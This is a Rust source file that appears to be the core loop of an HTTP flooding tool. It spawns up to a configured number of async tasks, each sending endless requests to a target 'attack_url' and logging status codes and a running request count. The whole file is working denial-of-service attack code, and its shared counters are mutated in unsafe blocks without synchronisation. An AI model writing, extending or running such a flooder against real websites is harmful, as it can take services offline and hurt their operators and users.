use tokio::time::Instant;
use crate::extra_fn;

use crate::ram_manger::{SAFE_PUB_VAR, UNSAFE_PUB_VAR};
use crate::where_attack::AttackData;

pub async fn start(passed_var: AttackData) {
    loop {
        core_attack(&passed_var);
    }
}

fn core_attack(passed_var: &AttackData) {
    let error_threads = SAFE_PUB_VAR.lock();
    match error_threads {
        Err(e) => {
            println!("error when starting thread: {}", e)
        }
        Ok(mut threads) => {
            if threads.thread_on + 1 < passed_var.threads {
                threads.thread_on += 1;
                unsafe {
                    UNSAFE_PUB_VAR.threads_on += 1;
                }
                drop(threads);
                tokio::spawn(async {
                    loop {
                        let now = Instant::now();
                        unsafe {
                            let error_data = extra_fn::request(&UNSAFE_PUB_VAR.attack_url);
                            match error_data.await {
                                Ok(status_code) => {
                                    UNSAFE_PUB_VAR.amount_sent += 1;
                                    println!(
                                        "Threads on {},\n Status code {},\n Time Passed for request {} sec,\n Request per 10 Millisecond {}",
                                        UNSAFE_PUB_VAR.threads_on,
                                        status_code.status(),
                                        now.elapsed().as_secs(),
                                        UNSAFE_PUB_VAR.amount_sent,
                                    );
                                }
                                Err(data) => {
                                    println!(
                                        "Threads on {}, Status ERROR {}\n Time: {}\n Request per 10 Millisecond {}",
                                        UNSAFE_PUB_VAR.threads_on,
                                        data,
                                        now.elapsed().as_secs(),
                                        UNSAFE_PUB_VAR.amount_sent
                                    );
                                }
                            }
                        }
                    }
                });
            } else {
                extra_fn::time_function();
            }
        }
    }
}

